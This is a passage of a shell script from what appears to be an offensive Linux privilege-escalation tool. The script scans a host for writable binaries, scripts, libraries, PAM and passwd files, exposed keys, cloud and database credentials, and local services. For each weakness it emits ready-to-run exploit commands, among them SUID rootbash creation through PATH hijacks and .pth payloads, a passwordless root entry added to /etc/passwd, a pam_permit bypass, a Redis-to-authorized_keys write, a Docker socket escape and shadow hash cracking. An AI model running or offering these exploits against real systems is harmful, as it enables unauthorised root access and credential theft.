            if [ -s "$_stock_tmp" ] && grep -qxF "$bin" "$_stock_tmp" 2>/dev/null; then
                continue
            fi

            # Record the custom binary exists
            local _bin_owner _bin_perms
            _bin_owner=$(stat -c '%U' "$bin" 2>/dev/null)
            _bin_perms=$(stat -c '%a' "$bin" 2>/dev/null)

            # Writable = trivial
            if verify_actually_writable "$bin" 2>/dev/null; then
                register_finding "CUSTOM_BIN_WRITABLE" "$bin" \
                    "Custom binary writable (owner=$_bin_owner perms=$_bin_perms): $bin" \
                    97 "custom_bin"
                register_exploit "CUSTOM_BIN_WRITABLE" "$bin" \
                    "cp /bin/bash $bin.bak; printf '#!/bin/bash -p\ncp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\n' > $bin; $bin; ${APEX_EXEC_DIR:-/tmp}/rootbash -p"
            fi

            # strings analysis for relative interpreter/command calls
            local _strs
            _strs=$(safe_run 10 apex_strings "$bin" 2>/dev/null)
            [ -z "$_strs" ] && continue

            # Relative interpreter patterns: python3, python, sh, bash, perl, etc.
            # These are the highest-value PATH hijack targets.
            local _interp_tmp
            _interp_tmp=$(mktemp 2>/dev/null) || _interp_tmp="/tmp/_apex_interp_$$"

            printf '%s\n' "$_strs" | grep -oE '^[a-z][a-z0-9_-]{1,20}$' 2>/dev/null | \
                sort -u | head -60 | while IFS= read -r tok; do
                case "$tok" in
                    python|python3|python2|perl|ruby|node|nodejs|sh|bash|dash|env|php|lua|java)
                        printf '%s\n' "$tok" >> "$_interp_tmp"
                        ;;
                esac
            done

            # PATH hijack synthesis: relative interpreter + writable exec dir = exploit
            if [ -s "$_interp_tmp" ] && [ -n "$_writable_exec_dirs" ]; then
                local _interp
                _interp=$(head -1 "$_interp_tmp" 2>/dev/null)

                # Find the best writable exec dir (prefer /dev/shm — less likely noexec)
                local _best_dir
                if [ -n "${APEX_EXEC_DIR:-}" ]; then
                    _best_dir="$APEX_EXEC_DIR"
                elif printf '%s\n' "$_writable_exec_dirs" | grep -qxF "/dev/shm"; then
                    _best_dir="/dev/shm"
                elif printf '%s\n' "$_writable_exec_dirs" | grep -qxF "/tmp"; then
                    _best_dir="/tmp"
                else
                    _best_dir=$(printf '%s\n' "$_writable_exec_dirs" | head -1)
                fi
                : "${_best_dir:=/tmp}"

                # Determine what the binary runs as (SUID → root, daemon user, etc.)
                local _runs_as="$_bin_owner"
                local _is_suid=""
                case "$_bin_perms" in *[47]*) _is_suid="yes" ;; esac
                local _conf=88
                [ "$_bin_owner" = "root" ] && _conf=92
                [ -n "$_is_suid" ] && _conf=95

                local _exploit_cmd
                _exploit_cmd=$(printf 'PATH=%s:$PATH\nprintf '"'"'#!/bin/bash -p\\ncp /bin/bash %s/rootbash; chmod 4755 %s/rootbash\\n'"'"' > %s/%s\nchmod +x %s/%s\n%s\n%s/rootbash -p' \
                    "$_best_dir" "$_best_dir" "$_best_dir" \
                    "$_best_dir" "$_interp" \
                    "$_best_dir" "$_interp" \
                    "$bin" \
                    "$_best_dir")

                register_finding "CUSTOM_BIN_PATH_HIJACK" "$bin" \
                    "Custom binary '$_bbase' calls '$_interp' without absolute path — PATH hijack via $_best_dir (runs as: $_runs_as)" \
                    "$_conf" "custom_bin"
                register_exploit "CUSTOM_BIN_PATH_HIJACK" "$bin" "$_exploit_cmd"
            fi
            rm -f "$_interp_tmp" 2>/dev/null

            # Also flag interesting absolute path refs that are writable
            printf '%s\n' "$_strs" | grep -oE '^/[A-Za-z0-9_./+-]{4,128}$' | \
                sort -u | head -40 | while IFS= read -r ref_path; do
                case "$ref_path" in
                    /lib/*|/lib64/*|/usr/lib/*|/proc/*|/sys/*|/dev/*) continue ;;
                esac
                [ -e "$ref_path" ] || continue
                if verify_actually_writable "$ref_path" 2>/dev/null; then
                    register_finding "CUSTOM_BIN_WRITABLE_REF" "$bin" \
                        "Custom binary '$_bbase' references writable path: $ref_path" \
                        82 "custom_bin"
                fi
            done
        done
    done

    rm -f "$_stock_tmp" 2>/dev/null
    return 0
}

map_groups_files() {
    # For each group the current user belongs to, find all files owned by that
    # group — revealing what group membership actually unlocks.
    # This is the critical step that reveals e.g. bank_backup.py, config files
    # with credentials, writable directories belonging to privileged groups.

    local _username
    _username="${APEX_USER:-$(id -un 2>/dev/null)}"
    local _my_groups
    _my_groups=$(id -Gn 2>/dev/null | tr ' ' '\n')

    # Skip generic OS groups — too noisy, low value
    local _skip_groups="root users nogroup nobody staff"

    local g
    printf '%s\n' "$_my_groups" | while IFS= read -r g; do
        [ -z "$g" ] && continue

        # Skip OS baseline groups
        case " $_skip_groups " in *" $g "*) continue ;; esac
        case "$g" in
            adm|cdrom|floppy|tape|scanner|plugdev|input|lpadmin|netdev) continue ;;
            bluetooth|audio|video|pulse|rtkit|avahi|messagebus|saned)   continue ;;
            systemd-*|nm-*|colord|geoclue|polkitd|usbmux|render|kvm)   continue ;;
            "$_username") continue ;;  # own private group
        esac

        # Find files belonging to this group (limit to 100 per group)
        local _gf_tmp
        _gf_tmp=$(mktemp 2>/dev/null) || _gf_tmp="/tmp/_apex_gf_${g}_$$"

        safe_run 15 apex_find / -group "$g" -not -path "/proc/*" -not -path "/sys/*" \
            2>/dev/null | head -100 > "$_gf_tmp"

        [ -s "$_gf_tmp" ] || { rm -f "$_gf_tmp" 2>/dev/null; continue; }

        local _count
        _count=$(wc -l < "$_gf_tmp" 2>/dev/null | tr -d ' ')

        # Report the file list as an informational finding
        local _file_list
        _file_list=$(head -20 "$_gf_tmp" 2>/dev/null | tr '\n' ' ')

        register_finding "GROUP_FILES_FOUND" "group:$g" \
            "Group '$g' owns $_count files. Notable: $_file_list" \
            35 "group_files"

        # Check each file for interesting properties
        while IFS= read -r gf; do
            [ -e "$gf" ] || continue
            local _gf_base
            _gf_base=$(basename "$gf")

            # Skip our own temp / session files — they're noise, not findings.
            case "$gf" in
                /tmp/apex_*|/tmp/trace_*|/tmp/.apex_*|/dev/shm/.apex_*|/tmp/sh-thd*|/tmp/tmp.*)
                    continue ;;
            esac

            # 1. Writable files owned by group (especially scripts)
            if verify_actually_writable "$gf" 2>/dev/null; then
                local _gf_conf=75
                # Escalate confidence for scripts/binaries
                case "$_gf_base" in
                    *.py|*.sh|*.pl|*.rb|*.php|*.js) _gf_conf=85 ;;
                esac
                # Check if it's executed by a privileged service
                local _owner
                _owner=$(stat -c '%U' "$gf" 2>/dev/null)
                [ "$_owner" = "root" ] && _gf_conf=$(( _gf_conf + 10 ))
                [ "$_gf_conf" -gt 97 ] && _gf_conf=97

                register_finding "GROUP_WRITABLE_FILE" "$gf" \
                    "File owned by group '$g' is writable: $gf (owner=$_owner)" \
                    "$_gf_conf" "group_files"

                # Generate exploit for writable scripts
                case "$_gf_base" in
                    *.py|*.sh|*.pl|*.rb)
                        register_exploit "GROUP_WRITABLE_FILE" "$gf" \
                            "printf 'import os; os.system(\"cp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\")\n' >> $gf  # wait for cron/service to run it"
                        ;;
                esac
            fi

            # 2. Executables in this group — we can run them
            if [ -x "$gf" ] && [ -f "$gf" ]; then
                local _exec_owner
                _exec_owner=$(stat -c '%U' "$gf" 2>/dev/null)
                if [ "$_exec_owner" = "root" ]; then
                    register_finding "GROUP_EXEC_ROOT_BINARY" "$gf" \
                        "Root-owned executable accessible via group '$g': $gf" \
                        72 "group_files"
                    register_exploit "GROUP_EXEC_ROOT_BINARY" "$gf" \
                        "# Run the binary and check for PATH/env hijack opportunities:\n$gf\nstrings $gf 2>/dev/null | grep -E '^[a-z][a-z0-9_-]{1,15}\$' | head -20"
                    # strings analysis for PATH hijack
                    if [ "$HAS_STRINGS" = "1" ]; then
                        local _exec_strs
                        _exec_strs=$(safe_run 10 apex_strings "$gf" 2>/dev/null)
                        printf '%s\n' "$_exec_strs" | grep -oE '^[a-z][a-z0-9_-]{1,20}$' | \
                            sort -u | head -30 | while IFS= read -r etok; do
                            case "$etok" in
                                python|python3|python2|perl|ruby|sh|bash|env|php|lua)
                                    register_finding "GROUP_EXEC_PATH_HIJACK" "$gf" \
                                        "Root binary '$_gf_base' (group=$g) calls '$etok' without absolute path" \
                                        90 "group_files"
                                    register_exploit "GROUP_EXEC_PATH_HIJACK" "$gf" \
                                        "printf '#!/bin/bash -p\ncp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash; chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\n' > ${APEX_EXEC_DIR:-/tmp}/$etok; chmod +x ${APEX_EXEC_DIR:-/tmp}/$etok; PATH=${APEX_EXEC_DIR:-/tmp}:\$PATH $gf; ${APEX_EXEC_DIR:-/tmp}/rootbash -p"
                                    ;;
                            esac
                        done
                    fi
                fi
            fi

            # 3. Sensitive config files readable via group
            case "$_gf_base" in
                *.conf|*.cfg|*.ini|*.env|*.key|*.pem|*.crt|id_rsa|id_ed25519|*.secret)
                    register_finding "GROUP_READABLE_SENSITIVE" "$gf" \
                        "Sensitive file readable via group '$g': $gf" \
                        60 "group_files"
                    ;;
                *password*|*passwd*|*credential*|*secret*|*token*|*.db|*.sqlite)
                    register_finding "GROUP_READABLE_SENSITIVE" "$gf" \
                        "Likely credential file readable via group '$g': $gf" \
                        65 "group_files"
                    ;;
            esac

        done < "$_gf_tmp"
        rm -f "$_gf_tmp" 2>/dev/null
    done

    return 0
}

map_nfs() {
    # /etc/exports with no_root_squash = the client can write as root to that
    # export. If we can also write to /etc/exports (e.g. shared admin host),
    # we can grant ourselves the privilege.

    if [ -r /etc/exports ]; then
        grep -v '^[[:space:]]*#' /etc/exports 2>/dev/null | grep -v '^[[:space:]]*$' | \
        while IFS= read -r line; do
            register_finding "NFS_EXPORT" "/etc/exports" \
                "NFS export defined: $line" 35 "nfs"
            case "$line" in
                *no_root_squash*)
                    register_finding "NFS_NO_ROOT_SQUASH" "/etc/exports" \
                        "NFS export with no_root_squash: $line — root from any mounting client" \
                        85 "nfs"
                    register_exploit "NFS_NO_ROOT_SQUASH" "/etc/exports" \
                        "On attacker host: mount -t nfs target:share /mnt; cp /bin/bash /mnt/rootbash; chmod +s /mnt/rootbash; then on target: /mnt/rootbash -p"
                    ;;
            esac
        done
        if verify_actually_writable /etc/exports 2>/dev/null; then
            register_finding "NFS_EXPORTS_WRITABLE" "/etc/exports" \
                "/etc/exports writable — add no_root_squash export" 90 "nfs"
        fi
    fi

    # showmount enumeration (network exposure of the server itself).
    if command -v showmount >/dev/null 2>&1; then
        local mounts
        mounts=$(safe_run 5 showmount -e 127.0.0.1 2>/dev/null)
        [ -n "$mounts" ] && register_finding "NFS_LOCAL_MOUNTS" "127.0.0.1" \
            "showmount -e localhost output present" 30 "nfs"
    fi

    return 0
}
map_neighbors_unreadables() {
    # C2 INTERESTING_UNREADABLE_DIR — flag custom-path dirs we cannot enter.
    # Cheap pointer for "investigate after pivot to the right user".
    # C3 NEIGHBOR_USER_PIVOT — for every readable /home/<other>/, surface the
    # juicy stuff: writable files inside, world-readable creds/keys,
    # .bash_history with secrets / sudo / mysql lines.
    local me_user
    me_user=$(id -un 2>/dev/null)
    [ -z "$me_user" ] && me_user="${USER:-_unknown}"

    # ─── C2 ────────────────────────────────────────────────────────────────
    local d
    for d in /opt/* /srv/* /var/lib/* /usr/local/share/* /etc/secrets /var/backups; do
        [ -e "$d" ] || continue
        # Already readable → not interesting for this lens
        [ -r "$d" ] && [ -x "$d" ] && continue
        local owner mode
        owner=$(stat -c '%U' "$d" 2>/dev/null)
        mode=$(stat -c '%a' "$d" 2>/dev/null)
        # Skip self-owned (we'd see what's inside via shell anyway)
        [ "$owner" = "$me_user" ] && continue
        register_finding "INTERESTING_UNREADABLE_DIR" "$d" \
            "Unreadable but referenced ($owner mode=$mode) — investigate after pivoting to $owner" \
            45 "neighbor_pivot"
    done

    # ─── C3 ────────────────────────────────────────────────────────────────
    [ -d /home ] || return 0
    local home base
    for home in /home/*; do
        [ -d "$home" ] || continue
        base=$(basename "$home")
        [ "$base" = "$me_user" ] && continue
        # Skip homes we cannot enter
        [ -r "$home" ] && [ -x "$home" ] || continue

        # World/group-readable private keys in their .ssh
        local _f
        if [ -d "$home/.ssh" ] && [ -r "$home/.ssh" ]; then
            for _f in "$home/.ssh"/id_rsa "$home/.ssh"/id_ed25519 \
                      "$home/.ssh"/id_ecdsa "$home/.ssh"/id_dsa; do
                [ -r "$_f" ] || continue
                register_finding "NEIGHBOR_KEY_READABLE" "$_f" \
                    "Neighbor user $base private key is readable: $_f — try ssh -i" \
                    92 "neighbor_pivot"
                register_exploit "NEIGHBOR_KEY_READABLE" "$_f" \
                    "chmod 600 $_f 2>/dev/null; ssh -i $_f -o StrictHostKeyChecking=no $base@127.0.0.1"
            done
        fi

        # Bash history mining — grep for credentials, sudo, mysql, psql
        local hist
        for hist in "$home/.bash_history" "$home/.zsh_history" "$home/.history"; do
            [ -r "$hist" ] || continue
            local hit
            hit=$(grep -E -m3 -i 'pass(wor)?d|secret|token|sudo |mysql|psql|ssh -i|curl.*-u ' "$hist" 2>/dev/null | head -3)
            if [ -n "$hit" ]; then
                register_finding "NEIGHBOR_HISTORY_HOT" "$hist" \
                    "$base history has secret/sudo hints: $(printf '%s' "$hit" | tr '\n' ';' | cut -c1-180)" \
                    70 "neighbor_pivot"
            fi
        done

        # Writable files INSIDE neighbor's home (we could plant payloads they exec)
        local wf wf_count=0
        for wf in $(find "$home" -maxdepth 3 -type f -writable 2>/dev/null | head -5); do
            wf_count=$(( wf_count + 1 ))
            verify_actually_writable "$wf" 2>/dev/null || continue
            register_finding "NEIGHBOR_WRITABLE_FILE" "$wf" \
                "Writable file inside $base's home: $wf — plant payload, wait for exec" \
                75 "neighbor_pivot"
        done

        # Common credential dotfiles
        local creds
        for creds in "$home/.my.cnf" "$home/.pgpass" "$home/.netrc" "$home/.aws/credentials" \
                     "$home/.docker/config.json" "$home/.kube/config"; do
            [ -r "$creds" ] || continue
            register_finding "NEIGHBOR_CRED_FILE" "$creds" \
                "Neighbor $base credential file readable: $creds" \
                85 "neighbor_pivot"
        done
    done
    return 0
}

map_processes() {
    # Find root processes whose cmdline is readable by us. The cmdline tells
    # us what's running as root: if it references a script we can write, we
    # win when the next invocation happens (cron or socket-trigger).

    local pdir pid status uid cmdline exe
    for pdir in /proc/[0-9]*/; do
        pid="${pdir%/}"; pid="${pid##*/}"
        status="${pdir}status"
        [ -r "$status" ] || continue
        uid=$(awk '/^Uid:/{print $2; exit}' "$status" 2>/dev/null)
        case "$uid" in 0) : ;; *) continue ;; esac
        # Readable cmdline / exe symlink readability tells us a lot.
        cmdline=$(tr '\0' ' ' < "${pdir}cmdline" 2>/dev/null | cut -c1-200)
        [ -z "$cmdline" ] && continue
        exe=$(readlink "${pdir}exe" 2>/dev/null)

        # Look for cmdline references to scripts in writable directories.
        local tok
        printf '%s\n' "$cmdline" | tr ' ' '\n' | while IFS= read -r tok; do
            case "$tok" in
                /*)
                    [ -e "$tok" ] || continue
                    if verify_actually_writable "$tok" 2>/dev/null; then
                        register_finding "PROC_ROOT_USES_WRITABLE" "$tok" \
                            "Root pid $pid invokes writable path: $tok (cmd: $cmdline)" \
                            93 "process"
                    fi
                    ;;
            esac
        done

        # Record interesting custom root processes (non-stock daemons).
        case "$exe" in
            /usr/sbin/*|/usr/bin/*|/sbin/*|/bin/*|/lib/systemd/*|/usr/lib/systemd/*|"")
                : # stock
                ;;
            *)
                register_finding "PROC_ROOT_CUSTOM_EXE" "$exe" \
                    "Root pid $pid uses non-stock exe: $exe" 50 "process"
                ;;
        esac
    done

    return 0
}
map_dbus() {
    local _f _pkver _pkver_major _pkver_minor

    # --- polkit / pkexec version check (PwnKit CVE-2021-4034) ---
    if command -v pkexec >/dev/null 2>&1; then
        _pkver=$(pkexec --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+(\.[0-9]+)?' | head -1)
        if [ -n "$_pkver" ]; then
            _pkver_major=$(printf '%s' "$_pkver" | cut -d. -f1)
            _pkver_minor=$(printf '%s' "$_pkver" | cut -d. -f2)
            # Vulnerable: polkit < 0.120 (fix released 2022-01-25)
            if [ "${_pkver_major:-1}" -eq 0 ] && [ "${_pkver_minor:-999}" -lt 120 ] 2>/dev/null; then
                register_finding "POLKIT_PWNKIT" "pkexec" \
                    "pkexec version $_pkver < 0.120 — CVE-2021-4034 (PwnKit) local root, no SUID/sudo needed" \
                    92 "kernel_cve"
                register_exploit "POLKIT_PWNKIT" "pkexec" \
                    "# Download: https://github.com/ly4k/PwnKit  then: ./PwnKit  (spawns root shell)"
            fi
        fi
    fi

    # --- Writable D-Bus policy files ---
    # Writable policy = add our own service → message bus accepts our privileged calls
    apex_find /etc/dbus-1 /usr/share/dbus-1 -name "*.conf" 2>/dev/null | \
    while IFS= read -r _f; do
        verify_actually_writable "$_f" 2>/dev/null || continue
        register_finding "DBUS_POLICY_WRITABLE" "$_f" \
            "D-Bus policy file writable: $_f — inject <allow send_destination='*'/> to bypass msg restrictions" \
            75 "dbus"
    done

    # --- Writable D-Bus service files (.service in dbus dirs, not systemd) ---
    apex_find /usr/share/dbus-1/services /usr/share/dbus-1/system-services \
        /etc/dbus-1/system.d /etc/dbus-1/session.d \
        -name "*.service" 2>/dev/null | \
    while IFS= read -r _f; do
        verify_actually_writable "$_f" 2>/dev/null || continue
        register_finding "DBUS_SERVICE_WRITABLE" "$_f" \
            "D-Bus service definition writable: $_f — replace Exec= line for code exec as service owner" \
            80 "dbus"
        register_exploit "DBUS_SERVICE_WRITABLE" "$_f" \
            "# Edit Exec= line in $_f to point to your payload, then: systemctl --user daemon-reload"
    done

    # --- busctl enumeration (if available) ---
    if command -v busctl >/dev/null 2>&1; then
        # List system bus interfaces — any with SetUID / RunAs / Exec methods = interesting
        local _bus_out
        _bus_out=$(safe_run 8 busctl list --system 2>/dev/null | \
            grep -iE '(polkit|systemd1|apt|snap|udisk|networkmanager|login1)' | \
            awk '{print $1}')
        if [ -n "$_bus_out" ]; then
            register_finding "DBUS_PRIVILEGED_SERVICE" "dbus" \
                "Privileged D-Bus services on system bus (potential exploit targets): $(safe_output "$_bus_out" | tr '\n' ' ' | cut -c1-120)" \
                40 "dbus"
        fi
    fi

    return 0
}
map_network() {
    local _ports _line _addr _port _svc

    # Collect listening ports — try ss first, then netstat, then /proc/net/tcp fallback
    _ports=""
    if command -v ss >/dev/null 2>&1; then
        _ports=$(safe_run 5 ss -tlnp 2>/dev/null | awk 'NR>1 && /LISTEN/{print $4}')
    elif command -v netstat >/dev/null 2>&1; then
        _ports=$(safe_run 5 netstat -tlnp 2>/dev/null | awk '/LISTEN/{print $4}')
    fi

    # /proc/net/tcp fallback (always readable, no binary needed)
    local _proc_ports=""
    if [ -r /proc/net/tcp ]; then
        _proc_ports=$(awk 'NR>1{
            split($2,a,":");
            port=strtonum("0x"a[2]);
            state=$4;
            if(state=="0A") printf "%d\n",port
        }' /proc/net/tcp 2>/dev/null)
    fi
    if [ -r /proc/net/tcp6 ]; then
        _proc_ports="$_proc_ports
$(awk 'NR>1{
            split($2,a,":");
            port=strtonum("0x"a[length(a)]);
            state=$4;
            if(state=="0A") printf "%d\n",port
        }' /proc/net/tcp6 2>/dev/null)"
    fi

    # Combine and deduplicate port numbers
    local _seen=""
    printf '%s\n%s\n' "$_ports" "$_proc_ports" | grep -oE '[0-9]+$' | sort -nu | \
    while IFS= read -r _port; do
        [ -z "$_port" ] || [ "$_port" = "0" ] && continue
        # Flag ports not exposed externally — localhost-only services nmap misses
        # Identify common interesting services
        case "$_port" in
            22)   _svc="SSH" ;;
            80|8080|8000|8888) _svc="HTTP" ;;
            443|8443) _svc="HTTPS" ;;
            3306) _svc="MySQL" ;;
            5432) _svc="PostgreSQL" ;;
            6379) _svc="Redis" ;;
            27017|27018) _svc="MongoDB" ;;
            2181) _svc="ZooKeeper" ;;
            6443) _svc="Kubernetes API" ;;
            2379|2380) _svc="etcd" ;;
            4848) _svc="Glassfish Admin" ;;
            9200|9300) _svc="Elasticsearch" ;;
            11211) _svc="Memcached" ;;
            5601) _svc="Kibana" ;;
            3000) _svc="Grafana/NodeApp" ;;
            *) _svc="service" ;;
        esac
        local _conf=35
        # Unauthenticated-by-default services = higher confidence
        case "$_port" in
            6379|27017|11211|9200|2379) _conf=75 ;;
            3306|5432) _conf=60 ;;
        esac
        register_finding "LOCAL_PORT" "$_port" \
            "Internal port $_port ($_svc) listening — probe with: curl/nc localhost:$_port or redis-cli/mongo/mysql as appropriate" \
            "$_conf" "network"
        # Service-specific exploit bodies for unauthenticated-by-default services
        case "$_port" in
            6379)
                register_exploit "LOCAL_PORT" "$_port" \
                    "# Redis unauth → root SSH key write (works if redis-server runs as root and writes to /root/.ssh/)
ssh-keygen -t rsa -N '' -f ${APEX_EXEC_DIR:-/tmp}/k -C apex 2>/dev/null
(echo; cat ${APEX_EXEC_DIR:-/tmp}/k.pub; echo) > ${APEX_EXEC_DIR:-/tmp}/kx
cat ${APEX_EXEC_DIR:-/tmp}/kx | redis-cli -h 127.0.0.1 -p 6379 -x set apexkey
redis-cli -h 127.0.0.1 -p 6379 config set dir /root/.ssh/
redis-cli -h 127.0.0.1 -p 6379 config set dbfilename authorized_keys
redis-cli -h 127.0.0.1 -p 6379 save
ssh -i ${APEX_EXEC_DIR:-/tmp}/k -o StrictHostKeyChecking=no root@127.0.0.1
# ALT (low-priv redis): write a webshell to /var/www/html or cron job to /var/spool/cron/root"
                ;;
            27017|27018)
                register_exploit "LOCAL_PORT" "$_port" \
                    "# MongoDB unauth enum
mongo --host 127.0.0.1 --port $_port --quiet --eval 'db.adminCommand({listDatabases:1})'
mongo --host 127.0.0.1 --port $_port --quiet --eval 'db.getSiblingDB(\"admin\").system.users.find().forEach(printjson)'"
                ;;
            11211)
                register_exploit "LOCAL_PORT" "$_port" \
                    "# Memcached unauth dump (may contain session tokens / creds)
( printf 'stats items\r\n'; sleep 1 ) | nc 127.0.0.1 11211
( printf 'stats cachedump 1 0\r\n'; sleep 1 ) | nc 127.0.0.1 11211"
                ;;
            9200)
                register_exploit "LOCAL_PORT" "$_port" \
                    "# Elasticsearch unauth
curl -s http://127.0.0.1:9200/_cat/indices
curl -s http://127.0.0.1:9200/_search?pretty | head -200"
                ;;
            3306)
                register_exploit "LOCAL_PORT" "$_port" \
                    "# MySQL — try empty/root via unix socket then UDF if FILE priv
mysql -u root -h 127.0.0.1 -e 'SHOW DATABASES;' 2>/dev/null
mysql -u root -e 'SHOW DATABASES;' 2>/dev/null    # unix socket — no password
# If mysql runs as root and you have FILE priv → write UDF .so to plugin dir → run sys_exec
# Find plugin dir: mysql -e \"SHOW VARIABLES LIKE 'plugin_dir';\""
                ;;
        esac
    done

    return 0
}
map_open_files() {
    local _f

    # Writable shared libraries (.so) — replace with malicious .so → code exec as whoever loads it
    apex_find /usr/lib /lib /usr/local/lib /usr/lib64 /lib64 \
        -name "*.so" -o -name "*.so.*" 2>/dev/null | \
    while IFS= read -r _f; do
        verify_actually_writable "$_f" 2>/dev/null || continue
        register_finding "WRITABLE_SO" "$_f" \
            "Writable shared library: $_f — replace with malicious .so for code exec" \
            95 "write_surface"
        register_exploit "WRITABLE_SO" "$_f" \
            "# Compile: gcc -shared -fPIC -o $_f evil.c (evil.c: void __attribute__((constructor)) init(){system(\"cp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash;chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\");})"
    done

    # Writable Python site-packages (.py files) — imported by root daemons
    apex_find /usr/lib/python3 /usr/local/lib/python3 /usr/lib/python2 /usr/local/lib/python2 \
        -name "*.py" 2>/dev/null | \
    while IFS= read -r _f; do
        verify_actually_writable "$_f" 2>/dev/null || continue
        register_finding "WRITABLE_PY_LIB" "$_f" \
            "Writable Python system library: $_f — append payload, triggered on next import" \
            88 "write_surface"
        register_exploit "WRITABLE_PY_LIB" "$_f" \
            "printf 'import os;os.system(\"cp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash;chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\")\n' >> $_f"
    done

    # Writable .pth files — auto-executed on ANY python3 import (highest value)
    apex_find /usr/lib/python3 /usr/local/lib/python3 \
        -name "*.pth" 2>/dev/null | \
    while IFS= read -r _f; do
        verify_actually_writable "$_f" 2>/dev/null || continue
        register_finding "WRITABLE_PTH" "$_f" \
            "Writable Python .pth file: $_f — prefix 'import os;os.system(...)' executes on any python3 start" \
            97 "write_surface"
        register_exploit "WRITABLE_PTH" "$_f" \
            "printf 'import os;os.system(\"cp /bin/bash ${APEX_EXEC_DIR:-/tmp}/rootbash;chmod 4755 ${APEX_EXEC_DIR:-/tmp}/rootbash\")\n' > $_f"
    done

    # Writable /etc configs owned by root (service restart → code exec)
    apex_find /etc -name "*.conf" -user root -not -path "/etc/ld.so.conf.d/*" 2>/dev/null | \
    while IFS= read -r _f; do
        verify_actually_writable "$_f" 2>/dev/null || continue
        register_finding "WRITABLE_ETC_CONF" "$_f" \
            "Root-owned config writable: $_f — modify and restart service for code exec" \
            72 "write_surface"
    done

    # Writable PAM config (add own auth module → root on next su/sudo/ssh)
    for _f in /etc/pam.d/common-auth /etc/pam.d/sudo /etc/pam.d/sshd /etc/pam.d/su; do
        verify_actually_writable "$_f" 2>/dev/null || continue
        register_finding "WRITABLE_PAM" "$_f" \
            "PAM config writable: $_f — prepend 'auth sufficient pam_permit.so' to bypass auth" \
            99 "write_surface"
        register_exploit "WRITABLE_PAM" "$_f" \
            "sed -i '1s/^/auth sufficient pam_permit.so\n/' $_f  # next sudo/su will succeed without password"
    done

    return 0
}
map_credential_files() {
    local _f _conf

    # /etc/passwd writable → add root user (CRITICAL-4 from design)
    if [ -w /etc/passwd ]; then
        register_finding "ETC_PASSWD_WRITABLE" "/etc/passwd" \
            "/etc/passwd is writable — append 'r00t::0:0::/root:/bin/bash' for root shell" \
            99 "credential"
        register_exploit "ETC_PASSWD_WRITABLE" "/etc/passwd" \
            "echo 'r00t::0:0::/root:/bin/bash' >> /etc/passwd; su r00t"
    fi

    # /etc/shadow readable (should never be by non-root)
    if [ -r /etc/shadow ] && [ "$(id -u)" != "0" ]; then
        register_finding "SHADOW_READABLE" "/etc/shadow" \
            "/etc/shadow readable as non-root — extract and crack hashes offline" \
            95 "credential"
        register_exploit "SHADOW_READABLE" "/etc/shadow" \
            "cat /etc/shadow | grep -v '!\\|*' > /tmp/hashes.txt  # then: john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt"
    fi

    # AWS credentials
    for _f in ~/.aws/credentials ~/.aws/config \
               /root/.aws/credentials /root/.aws/config; do
        [ -r "$_f" ] && grep -q '\[' "$_f" 2>/dev/null || continue
        register_finding "AWS_CREDS" "$_f" \
            "AWS credential file readable: $_f" 85 "credential"
    done

    # Kubernetes configs
    for _f in ~/.kube/config /root/.kube/config \
               /etc/kubernetes/admin.conf /etc/kubernetes/scheduler.conf \
               /etc/kubernetes/controller-manager.conf \
               /var/lib/kubelet/config.yaml; do
        [ -r "$_f" ] || continue
        register_finding "KUBE_CREDS" "$_f" \
            "Kubernetes config readable: $_f" 85 "credential"
    done

    # Database credential files
    for _f in ~/.pgpass ~/.my.cnf ~/.mycli ~/.pgcli \
               /root/.pgpass /root/.my.cnf \
               /etc/mysql/debian.cnf; do
        [ -r "$_f" ] || continue
        grep -qiE '(pass|pwd|password)' "$_f" 2>/dev/null || continue
        register_finding "DB_CREDS" "$_f" \
            "Database credential file readable: $_f" 82 "credential"
    done

    # SSH private keys outside standard ~/.ssh (already caught separately for ~/.ssh)
    apex_find /etc /opt /srv /var /home -maxdepth 6 \
        -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \
        -o -name "*.pem" -o -name "*.key" 2>/dev/null | \
    while IFS= read -r _f; do
        [ -r "$_f" ] || continue
        head -1 "$_f" 2>/dev/null | grep -q 'PRIVATE KEY' || continue
        # Skip our own home .ssh dir (handled by scan_ssh_keys)
        case "$_f" in "$HOME/.ssh/"*) continue ;; esac
        register_finding "SSH_KEY_EXPOSED" "$_f" \
            "Private key outside standard location: $_f" 88 "credential"
    done

    # Docker daemon socket (container escape)
    for _f in /var/run/docker.sock /run/docker.sock; do
        [ -r "$_f" ] || continue
        [ -S "$_f" ] || continue
        register_finding "DOCKER_SOCK_READABLE" "$_f" \
            "Docker socket readable — trivial container escape to root" 97 "credential"
        register_exploit "DOCKER_SOCK_READABLE" "$_f" \
            "docker -H unix://$_f run -it --rm -v /:/mnt alpine chroot /mnt sh"
    done

    # .netrc (cleartext FTP/HTTP credentials)
    for _f in ~/.netrc /root/.netrc; do
        [ -r "$_f" ] && [ -s "$_f" ] || continue
        register_finding "NETRC_CREDS" "$_f" \
            "$HOME/.netrc readable — may contain cleartext credentials" 78 "credential"
    done

    # GCloud / Azure / generic cloud CLI configs
    for _f in ~/.config/gcloud/credentials.db \
               ~/.azure/accessTokens.json \
               ~/.config/op/config; do
        [ -r "$_f" ] || continue
        register_finding "CLOUD_CREDS" "$_f" \
            "Cloud CLI credential file readable: $_f" 80 "credential"
    done

    return 0
}
map_credential_env() {
    # Scan /proc/*/environ for credentials in process environments
    # Catches: DB passwords, API keys, tokens passed as env vars to daemons
    local _envf _name _val _pid _uid
    local _our_uid
    _our_uid=$(id -u)

